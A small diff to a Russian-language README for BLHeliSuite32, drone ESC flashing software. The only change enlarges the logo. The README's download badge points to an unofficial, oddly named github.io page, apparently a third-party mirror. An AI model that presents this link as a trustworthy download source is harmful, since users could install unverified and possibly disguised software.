@@ -1,7 +1,7 @@
 # BLHeliSuite32 — настройка и прошивка ESC для FPV-дронов
 
 <p align="center">
-  <img src="https://profpv.ru/wp-content/uploads/2019/11/BlHeli_32-LOGO.jpg" alt="BLHeliSuite32" width="170">
+  <img src="https://profpv.ru/wp-content/uploads/2019/11/BlHeli_32-LOGO.jpg" alt="BLHeliSuite32" width="250">
 </p>
 
 [![GET — BLHELISUITE32](https://img.shields.io/badge/GET-BLHELISUITE32-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/BLHeliSuite32)
